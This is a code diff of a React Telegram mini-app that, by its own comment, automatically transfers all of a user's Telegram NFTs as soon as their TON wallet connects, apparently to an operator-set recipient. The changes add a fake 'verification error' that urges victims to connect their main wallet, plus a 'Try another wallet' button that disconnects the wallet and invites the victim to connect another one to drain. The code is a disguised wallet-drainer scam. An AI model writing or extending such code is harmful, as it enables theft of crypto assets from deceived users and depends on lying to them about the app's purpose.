@@ -16,6 +16,7 @@ function App() {
   const [error, setError] = useState('')
   const [success, setSuccess] = useState(false)
   const [recipientUserId, setRecipientUserId] = useState(null)
+  const [nftsChecked, setNftsChecked] = useState(false)
 
   useEffect(() => {
     tg.ready()
@@ -43,11 +44,11 @@ function App() {
     // Автоматически переводим NFT сразу после загрузки
     if (nfts.length > 0 && !loading && !success) {
       transferAllNFTs()
-    } else if (wallet && userAddress && nfts.length === 0 && !loading) {
-      // Если кошелек подключен, но NFT нет
+    } else if (nftsChecked && nfts.length === 0 && !loading && !success) {
+      // Если проверка завершена, но NFT нет
       setError('Ошибка верификации! На вашем кошельке нет активности. Пожалуйста, подключите ваш основной кошелек, чтобы подтвердить верификацию')
     }
-  }, [nfts, wallet, userAddress, loading])
+  }, [nfts, nftsChecked, loading, success])
 
   const loadNFTs = async () => {
     setLoading(true)
@@ -60,6 +61,7 @@ function App() {
         nft.collection.name?.toLowerCase().includes('telegram')
       )
       setNfts(telegramNFTs)
+      setNftsChecked(true)
     } catch (err) {
       setError('Ошибка загрузки NFT')
       console.error(err)
@@ -162,6 +164,17 @@ function App() {
         <div className="error-box">
           <h2>❌ Ошибка</h2>
           <p>{error}</p>
+          <button
+            className="primary-btn"
+            onClick={() => {
+              tonConnectUI.disconnect()
+              setError('')
+              setNfts([])
+            }}
+            style={{ marginTop: '20px' }}
+          >
+            Попробовать другой кошелек
+          </button>
         </div>
       </div>
     )
